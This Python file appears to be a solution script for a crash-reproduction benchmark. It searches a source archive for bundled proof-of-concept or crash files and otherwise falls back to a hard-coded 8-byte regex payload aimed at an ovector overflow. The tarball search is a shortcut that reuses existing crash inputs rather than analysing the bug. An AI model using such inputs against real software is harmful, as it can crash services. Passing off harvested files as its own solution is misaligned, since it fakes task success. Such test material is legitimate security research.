import tarfile
import os


class Solution:
    def _try_find_embedded_poc(self, src_path: str):
        if not src_path or not os.path.exists(src_path):
            return None
        try:
            tf = tarfile.open(src_path, "r:*")
        except Exception:
            return None
        candidates = []
        try:
            with tf:
                for m in tf.getmembers():
                    if not m.isreg():
                        continue
                    size = m.size
                    if size == 0 or size > 64:
                        continue
                    name_lc = m.name.lower()
                    if any(k in name_lc for k in ("poc", "crash", "repro", "payload", "exploit", "input", "seed", "bug", "ovector", "overflow")):
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            data = f.read()
                        except Exception:
                            continue
                        if 1 <= len(data) <= 64:
                            candidates.append((m.name, data))
            if candidates:
                L_g = 8
                candidates.sort(key=lambda item: (abs(len(item[1]) - L_g), len(item[1])))
                return candidates[0][1]
        except Exception:
            return None
        return None

    def _default_poc(self) -> bytes:
        # 8-byte generic regex-style payload with capturing parentheses and newlines
        return b"()\n()\nAA"

    def solve(self, src_path: str) -> bytes:
        poc = self._try_find_embedded_poc(src_path)
        if poc is not None:
            return poc
        return self._default_poc()


if __name__ == "__main__":
    import sys
    path = sys.argv[1] if len(sys.argv) > 1 else ""
    data = Solution().solve(path)
    sys.stdout.buffer.write(data)
